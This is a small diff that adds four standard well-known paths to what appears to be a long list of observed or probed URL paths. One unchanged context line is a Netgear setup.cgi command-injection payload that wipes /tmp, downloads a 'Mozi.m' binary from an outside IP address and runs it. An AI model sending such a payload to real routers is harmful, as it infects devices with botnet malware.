@@ -2545,3 +2545,7 @@ google.com:443
 /k.php
 /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://115.50.90.78:48023/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1
 /assets/global/plugins/plupload/examples/upload.php
+/.well-known/nodeinfo
+/.well-known/trust.txt
+/trust.txt
+/.well-known/openid-configuration
